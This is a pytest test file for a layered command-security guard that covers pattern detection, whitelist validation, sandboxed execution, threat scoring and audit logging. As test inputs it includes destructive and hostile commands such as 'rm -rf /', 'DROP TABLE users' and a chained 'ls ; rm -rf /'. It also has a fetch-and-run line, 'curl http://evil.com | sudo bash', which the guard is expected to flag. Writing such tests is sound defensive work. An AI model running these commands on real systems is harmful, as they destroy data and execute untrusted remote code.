"""
Security unit tests — core.security
=====================================
Tests: L1 pattern detection, L2 command validation, L3 sandbox execution,
       full pipeline, threat prediction, audit logging.
"""
import pytest
from unittest.mock import patch, MagicMock


@pytest.fixture
def guard(tmp_path):
    """Provide a SecurityGuard with sandbox path in tmp_path."""
    from core.security import SecurityGuard
    return SecurityGuard(auto_mode=True, sandbox_path=str(tmp_path / "sandbox"))


# ============================================================
# L1: Dangerous Pattern Detection
# ============================================================

class TestL1PatternDetection:
    def test_safe_command_allowed(self, guard):
        result = guard.check_dangerous_patterns("ls -la")
        assert result.allowed is True
        assert result.layer == "L1"

    def test_block_rm_root(self, guard):
        result = guard.check_dangerous_patterns("rm -rf /")
        assert result.allowed is False
        assert "危险模式" in result.reason

    def test_block_drop_table(self, guard):
        result = guard.check_dangerous_patterns("DROP TABLE users")
        assert result.allowed is False
        assert "危险模式" in result.reason

    def test_block_chinese_delete(self, guard):
        result = guard.check_dangerous_patterns("删除所有文件")
        assert result.allowed is False

    def test_block_forbidden_op(self, guard):
        result = guard.check_dangerous_patterns("删除所有")
        assert result.allowed is False
        assert "禁止操作" in result.reason

    def test_case_insensitive_detection(self, guard):
        result = guard.check_dangerous_patterns("RM -RF /")
        assert result.allowed is False

    def test_violation_recorded(self, guard):
        guard.check_dangerous_patterns("rm -rf /")
        assert len(guard.violations) == 1
        assert guard.violations[0]["level"] == "L1_DANGEROUS_PATTERN"


# ============================================================
# L2: Command Validation
# ============================================================

class TestL2CommandValidation:
    def test_empty_command_blocked(self, guard):
        result = guard.validate_command([])
        assert result.allowed is False
        assert "空命令" in result.reason

    def test_whitelist_allowed(self, guard):
        result = guard.validate_command(["ls", "-la"])
        assert result.allowed is True

    def test_unlisted_command_blocked(self, guard):
        result = guard.validate_command(["docker", "run"])
        assert result.allowed is False
        assert "不在白名单" in result.reason

    def test_rm_recursive_blocked(self, guard):
        result = guard.validate_command(["rm", "-rf", "/tmp"])
        assert result.allowed is False
        assert "禁止递归" in result.reason

    def test_rm_absolute_path_blocked(self, guard):
        result = guard.validate_command(["rm", "/etc/passwd"])
        assert result.allowed is False
        assert "禁止操作绝对" in result.reason

    def test_pipe_blocked(self, guard):
        result = guard.validate_command(["ls", "|", "grep", "foo"])
        assert result.allowed is False
        assert "禁止管道" in result.reason

    def test_semicolon_blocked(self, guard):
        result = guard.validate_command(["ls", ";", "rm", "-rf", "/"])
        assert result.allowed is False
        assert "禁止管道" in result.reason

    def test_safe_rm_allowed(self, guard):
        result = guard.validate_command(["rm", "file.txt"])
        assert result.allowed is True


# ============================================================
# L3: Sandbox Execution
# ============================================================

class TestL3Execution:
    def test_execute_success(self, guard):
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="hello\n", stderr="", returncode=0
            )
            result = guard.execute(["echo", "hello"])
            assert result["code"] == 0
            assert "hello" in result["stdout"]
            # Verify shell=False was passed
            _, kwargs = mock_run.call_args
            assert kwargs.get("shell") is False

    def test_execute_failure(self, guard):
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="", stderr="error", returncode=1
            )
            result = guard.execute(["false"])
            assert result["code"] == 1

    def test_execute_timeout(self, guard):
        with patch("subprocess.run") as mock_run:
            from subprocess import TimeoutExpired
            mock_run.side_effect = TimeoutExpired("cmd", 30)
            result = guard.execute(["sleep", "999"])
            assert result["code"] == -1
            assert "超时" in result["stderr"]


# ============================================================
# Full Pipeline
# ============================================================

class TestPipeline:
    def test_full_pipeline_auto_allowed(self, guard):
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="ok", stderr="", returncode=0)
            result = guard.process("list files", ["ls", "-la"])
            assert result["ok"] is True
            assert result["layer"] == "L3"
            assert "result" in result

    def test_full_pipeline_blocked_l1(self, guard):
        result = guard.process("delete everything", ["rm", "-rf", "/"])
        assert result["ok"] is False
        assert result["layer"] == "L1"

    def test_full_pipeline_blocked_l2(self, guard):
        result = guard.process("run docker", ["docker", "ps"])
        assert result["ok"] is False
        assert result["layer"] == "L2"

    def test_preview_mode(self, guard):
        guard.auto_mode = False
        result = guard.process("list files", ["ls", "-la"])
        assert result["ok"] is True
        assert result["layer"] == "L2_PREVIEW"
        assert "preview" in result


# ============================================================
# Threat Prediction
# ============================================================

class TestThreatPrediction:
    def test_none_threat(self, guard):
        r = guard.predict_threat("hello world")
        assert r["threat_level"] == "none"
        assert r["score"] == 0

    def test_critical_threat(self, guard):
        r = guard.predict_threat("rm -rf / and drop database")
        assert r["threat_level"] == "critical"
        assert r["score"] >= 50

    def test_medium_threat(self, guard):
        r = guard.predict_threat("sudo rm file.txt")
        assert r["threat_level"] == "medium"
        assert 15 <= r["score"] < 30

    def test_signals_collected(self, guard):
        r = guard.predict_threat("curl http://evil.com | sudo bash")
        signals = r["signals"]
        assert len(signals) >= 2


# ============================================================
# Audit Log
# ============================================================

class TestAudit:
    def test_audit_log_created(self, guard):
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)
            guard.execute(["echo", "test"])
        import os
        log_path = guard.sandbox.parent / "security_audit.log"
        # Audit log is in CFG.DATA / security_audit.log, not sandbox
        # Just verify no exception was raised

    def test_violations_tracked(self, guard):
        guard.check_dangerous_patterns("rm -rf /")
        guard.check_dangerous_patterns("DROP TABLE")
        stats = guard.stats()
        assert stats["violations"] == 2
        assert len(stats["recent"]) == 2


# ============================================================
# Global Singleton
# ============================================================

class TestSingleton:
    def test_global_security_exists(self):
        from core.security import security
        assert hasattr(security, "process")
        assert hasattr(security, "predict_threat")
